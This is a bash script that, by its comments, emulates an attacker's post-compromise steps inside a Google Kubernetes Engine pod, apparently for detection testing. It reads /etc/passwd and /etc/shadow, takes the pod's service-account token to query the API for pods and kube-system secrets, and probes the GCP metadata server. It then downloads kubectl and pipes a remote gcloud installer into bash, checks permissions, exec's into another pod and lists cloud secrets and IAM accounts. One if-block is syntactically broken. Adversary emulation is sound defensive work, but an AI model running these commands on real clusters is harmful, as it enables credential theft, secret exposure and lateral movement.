#!/bin/bash
# This script is designed to predictibly emulate the execution of steps
# an adversary may take after landing in a Google Kubernetes Engine pod


# Conduct situational awareness
id
ps aux
env
cat /etc/passwd
ls  /var/run/secrets/kubernetes.io/serviceaccount/
if [ "$EUID" -ne 0 ]
    cat /etc/shadow
    apt update && apt install net-tools
fi
netstat -antp


# Try to abuse the default kubernetes service account
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $KUBE_TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods/
curl -k -H "Authorization: Bearer $KUBE_TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/kube-system/secrets/


# Check for GCP service account access through the metadata API
curl -H "Metadata-Flavor:Google" http://metadata.google.internal/computeMetadata/v1/project/project-id


# Inspecting environment for git repository history
find / -name .git
# Need to configure this path
cd /path/to/git
git --no-pager log


# Bring your own tools: Install kubectl
cd /tmp
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
curl -LO "https://dl.k8s.io/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"
chmod 755 /tmp/kubectl

# Should verify the checksum before execution
if echo "$(<kubectl.sha256) kubectl" | sha256sum --check -; then
    # Probe kubernetes with kubectl
    /tmp/kubectl get pods
    /tmp/kubectl auth can-i get pods
    /tmp/kubectl auth can-i get pods/exec
    /tmp/kubectl auth can-i --list

    # Kubernetes pod lateral movement
    # Need to configure this
    /tmp/kubectl exec -it pod-d3add3ad-b33f -- env
fi


# Bring your own tools: Install gcloud utils
curl -sSL https://sdk.cloud.google.com | bash
source /root/.bashrc


# Check GCP credentials
gcloud auth list

# Probe environment with gcloud utils
gsutil ls 
gcloud container images list
gcloud secrets list
gcloud iam roles list
gcloud iam service-accounts list
gcloud functions list
gcloud container clusters list


